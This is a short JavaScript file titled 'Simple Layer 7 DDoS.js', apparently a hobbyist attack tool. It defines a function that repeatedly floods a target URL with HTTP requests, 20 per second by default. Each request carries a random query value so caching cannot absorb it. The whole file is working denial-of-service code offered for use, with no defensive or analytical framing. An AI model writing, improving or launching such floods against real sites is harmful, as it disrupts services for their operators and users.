//Simple Layer 7 DDoS.js
//Author: Mr Hery
//Date: 22 Oct 2023
var DDOS_ATTACK = null;

function attack(
		target, 
		method = "HEAD", 
		thread = 20, 
		packet = "", 
		random = true
	){
	if(DDOS_ATTACK == null){
		DDOS_ATTACK = setInterval(function(){
			for(var i = 0; i < thread; i++){
				var version = "";
				if(random){
					version = Math.floor(Math.random() * 1000);
				}
				
				var x = new XMLHttpRequest();
				x.open(method, target + "?v=" + version, true);
				x.send(packet);
			}
		}, 1000);
	}else{
		clearInterval(DDOS_ATTACK);
		DDOS_ATTACK = null;
	}
}
